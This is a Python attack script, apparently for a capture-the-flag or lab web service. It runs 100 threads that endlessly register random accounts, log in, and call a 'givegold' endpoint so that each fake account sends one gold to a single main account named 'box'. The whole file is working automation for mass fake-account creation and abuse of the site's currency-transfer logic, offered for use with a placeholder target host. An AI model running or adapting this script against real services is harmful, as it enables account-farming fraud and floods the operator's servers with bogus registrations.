import threading
import requests
import logging

from generator import *


host = "http://enter_your_ip"
login_post_url = f"{host}/api/login"
logout_post_url = f"{host}/api/logout"
create_post_url = f"{host}/api/create"
giving_post_url = f"{host}/api/givegold"

main_user = "box"
logging.basicConfig(level=logging.INFO)

def login_in_site(username: str, password: str, session: requests.Session) -> None:
    data = {
        "username": username,
        "password": password
    }
    req = session.post(login_post_url, data)

    if req.status_code == 200:
        logging.info(f"User {username} successfully logged in")
    else:
        logging.error(f"Error logging in: {req.status_code}")
        raise Exception(f"Error logging in: {req.status_code}")

def create_user(username: str, password: str) -> None:
    data = {
        "username": username,
        "password": password,
        "password2": password
    }
    response = requests.post(url=create_post_url, data=data)

    if response.status_code != 200:
        logging.error("Error creating user")
        raise Exception("Error creating user")

def giving_money(cookies: dict) -> None:
    data = {
        "user": main_user,
        "amount": 1
    }

    if cookies is None:
        logging.error("Cookies not found!")
        raise Exception("Cookies not found!")

    response = requests.post(url=giving_post_url, data=data, cookies=cookies)

    logging.info(f"Giving money response: {response.status_code}")

    if response.status_code != 200:
        logging.error("Error giving money")
        raise Exception("Error giving money")

def giving_loop(t_id: int) -> None:
    session = requests.Session()
    fail_attempt = 0
    success_attempt = 0

    while True:
        user = gen_unic_username()
        password = gen_unic_password()

        try:
            create_user(user, password)
            login_in_site(user, password, session)
            giving_money(session.cookies.get_dict())

            success_attempt += 1
            logging.info(f"Thread {t_id}, Attempt {success_attempt} succeeded")

        except Exception as e:
            fail_attempt += 1
            logging.error(f"Thread {t_id}, Attempt {fail_attempt} failed: {e}")

if __name__ == "__main__":
    num_threads = 100

    logging.info("Creating user: box")
    create_user(main_user, 'qaqsqdqe')
    logging.info("User created successfully!")

    for i in range(num_threads):
        browser_thread = threading.Thread(target=giving_loop, args=(i,))
        browser_thread.start()
